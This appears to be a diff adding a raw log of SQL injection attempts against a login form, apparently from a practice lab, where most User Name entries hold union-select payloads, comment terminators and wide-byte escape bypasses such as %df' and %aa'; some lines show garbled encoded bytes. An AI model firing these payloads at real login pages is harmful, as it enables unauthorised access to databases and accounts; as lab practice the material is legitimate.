@@ -1,0 +1,27 @@
+User Name:\Password:
+User Name:' union select 1,2 #Password:
+User Name:%aa' union select 1,2 #Password:
+User Name:%aa' union select 1,2,3 #Password:
+User Name:%df' union select 1,2  #Password:
+User Name:%aa" union select 1,2 #Password:
+User Name:%aa') union select 1,2 #Password:
+User Name:\Password:
+User Name:Password:
+User Name:发' union select 1,2 --+Password:
+User Name:发'\ union select 1,2 #Password:
+User Name:%aa' union select 1,2 #Password:
+User Name:%aa' union select 1,2 #Password:fda
+User Name:--Password:
+User Name:==+Password:
+User Name:--+Password:
+User Name:'--+Password:
+User Name:%aa' union select 1,2 --+Password:
+User Name:%27' union #Password:
+User Name:��'Password:
+User Name:��' union select 1,2 #Password:
+User Name:�' union select 1,2 #Password:
+User Name:\xff' union select 1,2 #Password:
+User Name:�' union select 1,2 #Password:
+User Name:�' union select 1,2 #Password:
+User Name:�' union select 1,2 #Password:
+User Name:�' union select 11,2 #Password:
